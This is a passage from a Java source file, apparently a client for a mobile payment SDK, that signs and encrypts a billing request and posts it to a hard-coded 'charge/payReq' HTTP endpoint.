		String charge_payReq_req = DmNetTools20.generateNetSignatureAndEncrypt(mg20irid, ReportStr, xml, ihJVd, Lwkn, headers.get("SDKVersion"), EDstr, ssov);
		// logger.info("post_charge_payReq.charge_payReq_req:"+charge_payReq_req);
		String Signature = DmTools20.HmacSHA1("+  +POST+add=0&en_billingreq=" + charge_payReq_req + headers.get("Header-Key"), "  &");
		// logger.info("post_charge_payReq.Signature:"+Signature);
		headers.put("X-OF-Signature", Signature);
		headers.put("Header-Signature", Signature);
		charge_payReq_req = DmTools20.URLencode(charge_payReq_req);
		DmNetWorkIO dmn = new DmNetWorkIO();
		result = dmn.netWorkIO("http://gmota.g188.net:8080/migusdk/charge/payReq", headers, "add=0&en_billingreq=" + charge_payReq_req);
		// logger.info("post_charge_payReq.charge_getSession_req:"+charge_payReq_req);
		// logger.info("post_charge_payReq.result:"+result);
		return result;
	}

}
